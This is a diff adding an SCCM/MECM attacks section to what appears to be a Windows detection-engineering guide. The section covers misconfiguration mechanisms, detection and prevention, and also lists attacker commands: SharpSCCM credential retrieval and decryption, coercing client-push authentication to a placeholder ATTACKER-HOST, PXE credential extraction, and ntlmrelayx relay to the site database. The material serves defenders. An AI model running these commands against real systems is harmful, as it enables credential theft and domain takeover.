@@ -19,7 +19,7 @@ Intermediate
 </td></tr>
 <tr><th scope="row" align="left" valign="top">Reading time</th><td>
 
-About 31 min (7,186 words at 230 words a minute)
+About 33 min (7,521 words at 230 words a minute)
 
 </td></tr>
 <tr><th scope="row" align="left" valign="top">Read this when</th><td>
@@ -1061,6 +1061,51 @@ Or:
 3. + 5156 (outbound connection from spawned process)
 
 Assign risk scores to each component event and alert when composite score exceeds threshold. This approach dramatically reduces false positives vs alerting on any single Event ID.
+
+### SCCM and MECM Attacks
+
+Microsoft Configuration Manager (formerly SCCM, now MECM) manages software and operating-system deployment across most of a Windows fleet, so a management point or site server can reach nearly every endpoint. Common misconfigurations expose credentials and provide a path to site and then domain takeover. The SpecterOps Misconfiguration Manager project organizes these into recon, credential, elevation, and takeover techniques, and is the reference taxonomy for the commands below.
+
+Mechanism:
+- Network Access Accounts (NAA) are domain credentials stored by clients to reach content, and a low-privileged user on a managed host can retrieve and decrypt them.
+- Automatic client push installation can be coerced so the push-installation account or the site server machine account authenticates to an attacker, which is then relayed.
+- PXE boot media protected with no password or a weak one yields the deployment credentials embedded in the boot variables.
+- Relaying coerced site-server or client authentication to the site database (MSSQL) or to the management point grants administrative control of the hierarchy.
+
+Attacker tooling:
+
+```
+# Retrieve Network Access Account credentials from the management point (low-privileged user)
+SharpSCCM.exe get naa
+
+# Decrypt NAA and task-sequence secrets from the local CIM store on a client
+SharpSCCM.exe local secrets
+
+# Coerce the site server to authenticate to an attacker host for NTLM relay
+SharpSCCM.exe invoke client-push -t ATTACKER-HOST
+
+# Enumerate devices and collections
+SharpSCCM.exe get collections
+
+# Extract credentials from password-free PXE boot media
+python3 pxethief.py 2 MECM-SERVER-IP
+
+# Relay coerced client-push machine authentication to the site database (TAKEOVER path)
+ntlmrelayx.py -t mssql://SITE-DB -smb2support
+```
+
+Detection:
+- NAA account logons from hosts that are not management points, and any interactive use of the NAA.
+- Client push installation authentications arriving at unexpected destinations (Event ID 4624 and 4648 from the site server or push account).
+- SMB or LDAP authentication from the site server machine account to hosts other than its known partners.
+
+Prevention:
+- Disable Network Access Accounts and use Enhanced HTTP or PKI certificates instead.
+- Disable automatic site-wide client push installation, or restrict and monitor the push account.
+- Require a strong PXE password or disable PXE where it is not needed.
+- Enforce SMB signing and LDAP channel binding so coerced authentication cannot be relayed, and treat the site server and site database as Tier 0 assets.
+
+This maps to ATT&CK T1555 (Credentials from Password Stores), T1557 (Adversary-in-the-Middle) for the relay paths, and T1078 (Valid Accounts) for the recovered credentials. For the wider Windows and Active Directory offensive command set, the recognized external cheat sheets are WADComs (`wadcoms.github.io`), GTFOBins (`gtfobins.github.io`), LOLBAS (`lolbas-project.github.io`), and LOLDrivers (`loldrivers.io`).
 
 ---
 
